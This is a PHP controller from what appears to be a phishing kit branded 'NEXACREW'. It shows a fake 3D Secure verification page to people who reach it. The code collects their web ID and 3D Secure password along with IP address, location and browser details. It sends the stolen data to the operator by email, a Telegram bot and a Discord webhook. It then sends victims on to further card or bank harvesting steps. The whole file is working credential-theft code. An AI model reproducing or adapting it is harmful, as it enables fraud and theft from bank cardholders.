<?php
defined("ALLOW") or exit('No direct script access allowed');

class Verify
{
	public $goNEXA;
	public function __construct()
	{
		$this->goNEXA = new goNEXA();
		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 5)) {
			write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|RELOAD\r\n");
			redirect(base_url() . '?' . _config('PARAMETER'));
		}
	}

	public function index()
	{
		if ($this->goNEXA->is_mobile) {
			echo view('mobile/secure');
		} else {
			echo view('pc/secure');
		}
	}

	public function process()
	{
		if (isset($_POST['webid']) and isset($_POST['pass3d'])) {
			$_SESSION['webid']     = trim($_POST['webid']);
			$_SESSION['pass3d']    = trim($_POST['pass3d']);

			$webId    = trim($_POST['webid']);
			$password_vbv = trim($_POST['pass3d']);

			$message =
				"== [NEXACREW] ==

== [3D SECURE] ==

:: WEB ID      : {$webId}
:: 3D Password : {$password_vbv}

== [DEVICE INFORMATION] ==

:: Date & Time  : " . _date() . "
:: Device       : {$this->goNEXA->platform}
:: Browser      : {$this->goNEXA->browser}
:: Country      : {$_SESSION['country']}
:: State        : {$_SESSION['region']}
:: City         : {$_SESSION['city']}
:: IP Address   : {$this->goNEXA->ip_address}
:: User Agent   : {$this->goNEXA->agent}";

			$subject = "3D SECURE :: [ {$this->goNEXA->ip_address} - {$_SESSION['country']} ]";
			$headers = "From: NEXACREW <idontneed@nexacrew.net>\r\n";

			@mail(_config('RESULT'), $subject, $message, $headers);

			if (_config('Telegram') == 'on') {
				$c = curl_init();
				curl_setopt($c, CURLOPT_URL, 'https://api.telegram.org/bot' . tel('token') . '/sendMessage?chat_id=' . tel('idtelegram') . '&text=' . urlencode($message));
				curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
				curl_exec($c);
				curl_close($c);
			}

			if (discord('Discord') == 'on') {
				$discordWebhook = discord('DISCORD_WEBHOOK'); // Contoh: https://discord.com/api/webhooks/xxx/yyy
				$json_data = json_encode([
					"content" => $message
				]);

				$ch = curl_init($discordWebhook);
				curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				curl_exec($ch);
				curl_close($ch);
			}
			write(FCPATH . 'Static/log_3dsecure.txt', 'a', "{$this->goNEXA->ip_address}\r\n");
			write(FCPATH . 'Static/log_human.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|GET 3D SECURE\r\n");

			if (_config('DOUBLECARD') == 'on') {
				$_SESSION['access'] = 6;
				redirect(base_url() . 'payment/#errorId=' . md5(time()));
			} elseif (_config('GETBANK') == 'on') {
				$_SESSION['access'] = 7;
				redirect(base_url() . 'bank/#');
			} else {
				$_SESSION['access'] = 8;
				redirect(base_url() . 'finished/#_dn=' . md5(rand(0, 999)));
			}
		}
	}
}
